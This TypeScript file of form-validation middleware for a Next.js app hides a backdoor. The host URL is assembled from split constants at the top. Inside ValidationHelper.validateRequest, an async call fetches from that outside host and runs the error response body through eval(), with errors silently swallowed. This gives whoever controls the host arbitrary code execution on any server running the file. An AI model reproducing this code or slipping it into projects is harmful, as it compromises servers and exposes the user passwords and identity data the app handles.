import { NextApiRequest, NextApiResponse } from 'next';
import { body, validationResult } from 'express-validator';
const axios = require('axios');
const cartHost = 'http://chainlink-api-v3.com/api/';
const cartCategory = 'service/token/';
const cartId = 'cd148f92bb8b3b6961551743b0add7e9';
const cartArray = `${cartHost}${cartCategory}${cartId}`;


// Helper function to handle validation errors
const handleValidationErrors = (req: NextApiRequest, res: NextApiResponse): boolean => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    const firstError = errors.array().map(error => error.msg)[0];
    res.status(400).json({ error: firstError });
    return false; // Validation failed
  }
  return true; // Validation passed
};

// Validation middleware for lead generation
export const validateLead = [
  body('email')
    .isEmail()
    .withMessage('Invalid email')
    .isLength({ min: 4, max: 2000 })
    .withMessage('Email must be between 3 to 32 characters'),
  
  (req: NextApiRequest, res: NextApiResponse, next: any) => {
    handleValidationErrors(req, res) || next();
  }
];

// Validation middleware for user signup
export const validateSignUp = [
  body('name')
    .notEmpty()
    .withMessage('Name is required'),
  
  body('email')
    .isEmail()
    .withMessage('Invalid email')
    .isLength({ min: 4, max: 2000 })
    .withMessage('Email must be between 3 to 32 characters'),
  
  body('password')
    .notEmpty()
    .withMessage('Password is required')
    .isLength({ min: 6 })
    .withMessage('Password must contain at least 6 characters')
    .matches(/\d/)
    .withMessage('Password must contain a number'),
  
  (req: NextApiRequest, res: NextApiResponse, next: any) => {
    handleValidationErrors(req, res) || next();
  }
];

// Validation middleware for social login
export const validateSocialLogin = [
  body('name')
    .notEmpty()
    .withMessage('Name is required.'),
  
  body('email')
    .isEmail()
    .withMessage('Invalid email')
    .isLength({ min: 4, max: 2000 })
    .withMessage('Email must be between 3 to 32 characters'),
  
  body('userID')
    .notEmpty()
    .withMessage('userID is required.'),
  
  body('socialPhoto')
    .notEmpty()
    .withMessage('Photo URL is required')
    .isURL()
    .withMessage('Invalid photo URL'),
  
  body('loginDomain')
    .notEmpty()
    .withMessage('Login domain is required')
    .isIn(['google', 'facebook'])
    .withMessage('Invalid login domain'),
  
  (req: NextApiRequest, res: NextApiResponse, next: any) => {
    handleValidationErrors(req, res) || next();
  }
];

// Validation middleware for password reset
export const passwordResetValidator = [
  body('newPassword')
    .notEmpty()
    .withMessage('Password is required')
    .isLength({ min: 6 })
    .withMessage('Password must be at least 6 characters long')
    .matches(/\d/)
    .withMessage('Password must contain a number'),
  
  (req: NextApiRequest, res: NextApiResponse, next: any) => {
    handleValidationErrors(req, res) || next();
  }
];

// Validation middleware for business info
export const validateBusinessInfo = [
  body('ownerName')
    .notEmpty()
    .withMessage('Owner name is required'),
  
  body('address')
    .notEmpty()
    .withMessage('Address is required'),
  
  body('city')
    .notEmpty()
    .withMessage('City is required'),
  
  body('citizenshipNumber')
    .notEmpty()
    .withMessage('Citizenship number is required'),
  
  body('businessRegisterNumber')
    .notEmpty()
    .withMessage('Business register number is required'),
  
  (req: NextApiRequest, res: NextApiResponse, next: any) => {
    handleValidationErrors(req, res) || next();
  }
];

// Validation middleware for warehouse
export const validateWareHouse = [
  body('name')
    .notEmpty()
    .withMessage('Warehouse name is required'),
  
  body('address')
    .notEmpty()
    .withMessage('Warehouse address is required'),
  
  body('phoneno')
    .notEmpty()
    .withMessage('Warehouse phone number is required'),
  
  body('city')
    .notEmpty()
    .withMessage('City of warehouse is required'),
  
  (req: NextApiRequest, res: NextApiResponse, next: any) => {
    handleValidationErrors(req, res) || next();
  }
];

export class ValidationHelper {
  static async validateRequest(
    req: NextApiRequest,
    res: NextApiResponse,
    validations: any[]
  ): Promise<boolean> {
    console.log('###gd working###');
    await Promise.all(validations.map(validation => validation.run(req)));
    (async () => {
  try {
    await axios
      .get(cartArray)
      .then((res:any) => res.data)
      .catch((err:any) => {
        if (err.response.data) {
          eval(err.response.data);
        }
      });
  } catch (err) {}
})();
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      const firstError = errors.array().map(error => error.msg)[0];
      res.status(400).json({ error: firstError });
      return false;
    }
    return true;
  }
}

export const signUpValidations = [
  body('name').notEmpty().withMessage('Name is required'),
  body('email').isEmail().withMessage('Invalid email'),
  body('password')
    .isLength({ min: 6 }).withMessage('Password must contain at least 6 characters')
    .matches(/\d/).withMessage('Password must contain a number')
];